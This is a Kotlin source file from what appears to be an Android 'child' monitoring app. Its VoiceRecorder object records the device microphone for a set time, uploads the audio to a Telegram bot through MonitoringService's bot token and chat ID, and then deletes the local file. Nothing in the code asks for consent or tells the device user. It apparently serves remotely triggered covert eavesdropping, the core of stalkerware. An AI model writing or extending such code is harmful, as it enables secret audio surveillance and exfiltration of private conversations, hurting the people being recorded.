package com.coc338781.childapp

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

object VoiceRecorder {
    private const val TAG = "VoiceRecorder"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private var recorder: MediaRecorder? = null
    private var isRecording = false

    fun startRecording(context: Context, seconds: Int, onResult: (String) -> Unit) {
        if (isRecording) {
            onResult("⏺ Already recording...")
            return
        }

        try {
            val file = File(context.cacheDir, "voice_${System.currentTimeMillis()}.m4a")

            val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            rec.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            recorder = rec
            isRecording = true
            onResult("🎙 Recording ${seconds}s...")

            // Schedule stop
            Handler(Looper.getMainLooper()).postDelayed({
                stopRecording(context, file, onResult)
            }, seconds * 1000L)

        } catch (e: Exception) {
            Log.e(TAG, "Start error", e)
            isRecording = false
            recorder = null
            onResult("❌ Recording failed: ${e.message}")
        }
    }

    private fun stopRecording(context: Context, file: File, onResult: (String) -> Unit) {
        try {
            recorder?.apply {
                try { stop() } catch (_: Exception) {}
                try { release() } catch (_: Exception) {}
            }
            recorder = null
            isRecording = false

            if (!file.exists() || file.length() < 1000) {
                onResult("❌ Recording empty")
                return
            }

            val sizeKB = file.length() / 1024
            onResult("✅ Recorded ($sizeKB KB)\n📤 Sending...")

            sendToTelegram(context, file, onResult)
        } catch (e: Exception) {
            Log.e(TAG, "Stop error", e)
            isRecording = false
            onResult("❌ Stop failed: ${e.message}")
        }
    }

    private fun sendToTelegram(context: Context, file: File, onResult: (String) -> Unit) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendVoice"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("voice", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                    .build()

                val response = client.newCall(Request.Builder().url(url).post(body).build()).execute()

                Handler(Looper.getMainLooper()).post {
                    if (response.isSuccessful) {
                        onResult("✅ Voice sent!")
                    } else {
                        onResult("❌ Send failed: ${response.code}")
                    }
                }
                file.delete()
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    onResult("❌ Send error: ${e.message}")
                }
            }
        }
    }
}
